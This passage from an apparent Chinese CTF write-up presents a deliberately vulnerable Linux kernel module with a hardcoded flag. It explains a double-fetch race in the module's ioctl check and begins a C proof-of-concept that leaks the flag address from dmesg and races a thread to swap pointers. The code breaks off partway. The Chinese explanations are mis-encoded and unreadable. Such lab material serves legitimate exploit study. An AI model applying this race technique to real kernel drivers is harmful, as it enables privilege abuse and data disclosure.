class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kdev_t.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡</span></span><br><span class="line"><span class="comment">//static char *buffer_var = NULL;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *buffer_var = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">devClass</span>;</span> <span class="comment">// Global variable for the device class</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">dev_t</span> condition_dev_no;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flagStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">char</span>* flagUser;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">flagStruct</span>* <span class="title">flagObj</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* flag = <span class="string">&quot;flag&#123;PIG007NBHH&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">condition_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">condition_open</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">condition_close</span><span class="params">(struct inode *i, struct file *f)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">chk_range_not_ok</span><span class="params">(<span class="keyword">ssize_t</span> v1,<span class="keyword">ssize_t</span> v2)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">condition_fops</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">                .owner = THIS_MODULE,</span><br><span class="line">                .open = condition_open,</span><br><span class="line">                .release = condition_close,</span><br><span class="line">                .unlocked_ioctl = condition_ioctl</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">condition_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module condition registered&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (alloc_chrdev_region(&amp;condition_dev_no, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;condition&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((devClass = class_create(THIS_MODULE, <span class="string">&quot;chardrv&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        unregister_chrdev_region(condition_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (device_create(devClass, <span class="literal">NULL</span>, condition_dev_no, <span class="literal">NULL</span>, <span class="string">&quot;condition&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[i] Module condition error&quot;</span>);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(condition_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;cdev, &amp;condition_fops);</span><br><span class="line">    <span class="keyword">if</span> (cdev_add(&amp;cdev, condition_dev_no, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        device_destroy(devClass, condition_dev_no);</span><br><span class="line">        class_destroy(devClass);</span><br><span class="line">        unregister_chrdev_region(condition_dev_no, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] &lt;Major, Minor&gt;: &lt;%d, %d&gt;\n&quot;</span>, MAJOR(condition_dev_no), MINOR(condition_dev_no));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">condition_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·</span></span><br><span class="line">    unregister_chrdev_region(condition_dev_no, <span class="number">1</span>);</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">condition_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Ioctl Get!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">111</span>: <span class="comment">//doubleCon  //get flag_addr</span></span><br><span class="line">            printk(<span class="string">&quot;Your flag is at %llx! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>,flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>: <span class="comment">//doubleCon  //print flag</span></span><br><span class="line">            flagObj =  (struct flagStruct*)arg;</span><br><span class="line">            <span class="keyword">ssize_t</span> userFlagAddr = flagObj-&gt;flagUser;</span><br><span class="line">            <span class="keyword">ssize_t</span> userFlagObjAddr = (<span class="keyword">ssize_t</span>)flagObj;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">if</span>(chk_range_not_ok(userFlagAddr,flagObj-&gt;len)</span><br><span class="line">                &amp;&amp;chk_range_not_ok(userFlagObjAddr,<span class="number">0</span>)</span><br><span class="line">                &amp;&amp;(flagObj-&gt;len == <span class="built_in">strlen</span>(flag)))</span><br><span class="line">    </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(flagObj-&gt;flagUser,flag,<span class="built_in">strlen</span>(flag)))</span><br><span class="line">                    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    printk(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                printk(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">chk_range_not_ok</span><span class="params">(<span class="keyword">ssize_t</span> v1,<span class="keyword">ssize_t</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((v1 + v2) &lt;= <span class="number">0x7ffffffff000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">condition_open</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module condition: open()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">condition_close</span><span class="params">(struct inode *i, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    kfree(buffer_var);</span><br><span class="line">    <span class="comment">//buffer_var = NULL;</span></span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;[i] Module condition: close()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(condition_init);</span><br><span class="line">module_exit(condition_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">// MODULE_AUTHOR(&quot;blackndoor&quot;);</span></span><br><span class="line"><span class="comment">// MODULE_DESCRIPTION(&quot;Module vuln overflow&quot;);</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="1-å‰ç½®çŸ¥è¯†"   >
          <a href="#1-å‰ç½®çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®çŸ¥è¯†" class="headerlink" title="(1)å‰ç½®çŸ¥è¯†"></a>(1)å‰ç½®çŸ¥è¯†</h3>
      <p>ä¸»è¦æ˜¯çº¿ç¨‹çš„çŸ¥è¯†ã€‚</p>
<p>å°±æ˜¯å¦‚æœä¸€ä¸ªå˜é‡æ˜¯å…¨å±€çš„ï¼Œé‚£ä¹ˆåœ¨æ²¡æœ‰é”çš„æƒ…å†µå°±ä¼šå¯¼è‡´ä¸€ä¸ªç¨‹åºçš„ä¸åŒçº¿ç¨‹å¯¹è¯¥å…¨å±€å˜é‡è¿›è¡Œçš„ç«äº‰è¯»å†™æ“ä½œã€‚å°±åƒè¿™é‡Œç»™å‡ºçš„ä»£ç ï¼Œé¦–å…ˆflagåœ¨å†…æ ¸æ¨¡å—ä¸­æ˜¯é™æ€å…¨å±€çš„ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* flag = <span class="string">&quot;flag&#123;PIG007NBHH&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//--------------------------------------------------</span></span><br><span class="line"><span class="keyword">if</span>(chk_range_not_ok(userFlagAddr,flagObj-&gt;len)</span><br><span class="line">   &amp;&amp;chk_range_not_ok(userFlagObjAddr,<span class="number">0</span>)</span><br><span class="line">   &amp;&amp;(flagObj-&gt;len == <span class="built_in">strlen</span>(flag)))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(flagObj-&gt;flagUser,flag,<span class="built_in">strlen</span>(flag)))</span><br><span class="line">        printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printk(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-æ£€æµ‹ï¼š"   >
          <a href="#2-æ£€æµ‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ£€æµ‹ï¼š" class="headerlink" title="(2)æ£€æµ‹ï¼š"></a>(2)æ£€æµ‹ï¼š</h3>
      <p>å…ˆæ£€æµ‹ä¼ å…¥çš„æ•°æ®çš„åœ°å€æ˜¯å¦æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ï¼Œé•¿åº¦æ˜¯å¦ä¸ºflagçš„é•¿åº¦ï¼Œä¼ å…¥çš„æ‰€æœ‰æ•°æ®æ˜¯å¦å¤„åœ¨ç”¨æˆ·ç©ºé—´ã€‚å¦‚æœéƒ½æ˜¯ï¼Œå†åˆ¤æ–­ä¼ å…¥çš„æ•°æ®ä¸flagæ˜¯å¦ä¸€è‡´ï¼Œä¸€è‡´åˆ™æ‰“å°flagï¼Œå¦åˆ™æ‰“å°Wrongç„¶åé€€å‡ºã€‚</p>
<p>è¿™ä¹ˆä¸€çœ‹å¥½åƒæ— æ³•å¾—åˆ°flagï¼Œé¦–å…ˆflagæˆ‘ä»¬ä¸çŸ¥é“ï¼Œæ˜¯ç¡¬ç¼–ç åœ¨å†…æ ¸æ¨¡å—ä¸­çš„ã€‚å…¶æ¬¡å°±ç®—æ— æ³•ä¼ å…¥å†…æ ¸æ¨¡å—ä¸­çš„åœ°å€ï¼Œæ„å‘³ç€å°±ç®—æˆ‘ä»¬è·å¾—äº†å†…æ ¸æ¨¡å—ä¸­flagçš„åœ°å€å’Œé•¿åº¦ï¼Œä¼ è¿›å»ä¹Ÿä¼šåˆ¤å®šå¤±è´¥ã€‚</p>

        <h3 id="3-æ¼æ´"   >
          <a href="#3-æ¼æ´" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ¼æ´" class="headerlink" title="(3)æ¼æ´"></a>(3)æ¼æ´</h3>
      <p>ä½†æ˜¯è¿™æ˜¯å»ºç«‹åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­çš„ï¼Œå¦‚æœæ˜¯å¤šä¸ªçº¿ç¨‹å‘¢ã€‚åœ¨æˆ‘ä»¬ä¼ å…¥ç”¨æˆ·ç©ºé—´çš„æŸä¸ªæ•°æ®åœ°å€å’Œé•¿åº¦ä¹‹åï¼Œå…ˆè¿›å…¥ç¨‹åºçš„ifè¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¿›å…¥å¦‚ä¸‹ifè¯­å¥</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(chk_range_not_ok(userFlagAddr,flagObj-&gt;len)</span><br><span class="line">   &amp;&amp;chk_range_not_ok(userFlagObjAddr,<span class="number">0</span>)</span><br><span class="line">   &amp;&amp;(flagObj-&gt;len == <span class="built_in">strlen</span>(flag)))</span><br></pre></td></tr></table></div></figure>

<p>ç„¶ååœ¨æ£€æµ‹flagæ•°æ®ä¹‹å‰ï¼Œä¹Ÿå°±æ˜¯å¦‚ä¸‹ifè¯­å¥ä¹‹å‰ï¼Œå¯åŠ¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹æŠŠä¼ å…¥çš„è¯¥æ•°æ®åœ°å€ç»™æ”¹æˆå†…æ ¸æ¨¡å—çš„flagçš„æ•°æ®åœ°å€ï¼Œè¿™æ ·å°±èƒ½æˆåŠŸæ‰“å°flagäº†ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(flagObj-&gt;flagUser,flag,<span class="built_in">strlen</span>(flag)))</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå°±ç›´æ¥ç»™å‡ºPOCï¼Œè¿™é‡Œæ¶‰åŠåˆ°ä¸€äº›çº¿ç¨‹çš„æ“ä½œï¼Œå¯ä»¥è‡ªå·±å­¦ä¹ ä¸€ä¸‹ã€‚</p>

        <h3 id="4-POC"   >
          <a href="#4-POC" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-POC" class="headerlink" title="(4)POC"></a>(4)POC</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static exp.c -lpthread -o exp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//char *strstr(const char *haystack, const char *needle);</span></span><br><span class="line"><span class="comment">//#define _GNU_SOURCE         /* See feature_test_macros(7) */</span></span><br><span class="line"><span class="comment">//char *strcasestr(const char *haystack, const char *needle);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRYTIME 0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flagStruct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">char</span>* flagUseAddr;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">flagStruct</span> <span class="title">flagChunk</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//open dev</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">openDev</span><span class="params">(<span class="keyword">char</span>* pos)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> readFlagBuf[<span class="number">0x1000</span>+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> finish =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> flagKerneladdr;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">changeFlagAddr</span><span class="params">(<span class="keyword">void</span>* arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> devFD;</span><br><span class="line">    <span class="keyword">int</span> addrFD;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> memOffset;</span><br><span class="line">    <span class="keyword">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//open Dev</span></span><br><span class="line">    <span class="keyword">char</span>* pos = <span class="string">&quot;/dev/condition&quot;</span>;</span><br><span class="line">    devFD = openDev(pos);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> flagBuf[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    flagReadFun(devFD,<span class="number">16</span>,flagBuf);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addrFD = open(<span class="string">&quot;/tmp/record.txt&quot;</span>,O_RDONLY);</span><br><span class="line">    lseek(addrFD,<span class="number">-0x1000</span>,SEEK_END);</span><br><span class="line">    read(addrFD,readFlagBuf,<span class="number">0x1000</span>);</span><br><span class="line">    close(addrFD);</span><br><span class="line">    <span class="keyword">int</span> flagIdxInBuf;</span><br><span class="line">    flagIdxInBuf = <span class="built_in">strstr</span>(readFlagBuf,<span class="string">&quot;Your flag is at &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flagIdxInBuf == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Not found addr&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        flagIdxInBuf+=<span 